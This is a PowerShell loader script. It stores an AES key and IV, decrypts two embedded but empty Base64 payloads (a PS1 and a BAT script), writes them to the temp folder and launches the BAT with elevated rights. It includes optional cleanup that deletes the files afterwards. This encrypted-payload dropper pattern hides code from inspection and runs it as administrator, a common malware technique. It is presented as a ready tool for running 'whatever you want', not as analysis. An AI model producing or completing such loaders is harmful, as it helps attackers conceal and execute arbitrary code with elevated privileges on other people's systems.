# --- AES Key and IV (Base64) ---
$keyBase64 = "dYtF5UUa8hVemBC1RsI7KQ=="
$ivBase64  = "5REITGidwM+Hol77A3kFiA=="

# --- Encrypted PS1 (Base64) ---
$encryptedPs1Base64 = @"


"@

# --- Encrypted BAT (Base64) ---
$encryptedBatBase64 = @"


"@

# Convert key and IV to bytes
$key = [Convert]::FromBase64String($keyBase64)
$iv = [Convert]::FromBase64String($ivBase64)

# AES decrypt function
function Decrypt-String([string]$encBase64, [byte[]]$key, [byte[]]$iv) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $decryptor = $aes.CreateDecryptor()
    $encBytes = [Convert]::FromBase64String($encBase64)

    $ms = New-Object System.IO.MemoryStream($encBytes)
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $sr = New-Object System.IO.StreamReader($cs)

    $plaintext = $sr.ReadToEnd()

    $sr.Close()
    $cs.Close()
    $ms.Close()
    $aes.Dispose()

    return $plaintext
}

# Decrypt both scripts
$ps1Content = Decrypt-String $encryptedPs1Base64 $key $iv
$batContent = Decrypt-String $encryptedBatBase64 $key $iv

# Save decrypted scripts as temp files
$tempPs1 = Join-Path $env:TEMP "temp_script.ps1"
$tempBat = Join-Path $env:TEMP "temp_script.bat"

Set-Content -Path $tempPs1 -Value $ps1Content -Encoding UTF8
Set-Content -Path $tempBat -Value $batContent -Encoding ASCII

Write-Host "Decrypted scripts saved."

# Run BAT file elevated (which should execute whatever you want)
Start-Process -FilePath $tempBat -Verb RunAs

# Optionally cleanup after some delay (uncomment if needed)
# Start-Sleep -Seconds 10
# Remove-Item $tempPs1, $tempBat -Force

Write-Host "BAT file launched elevated."
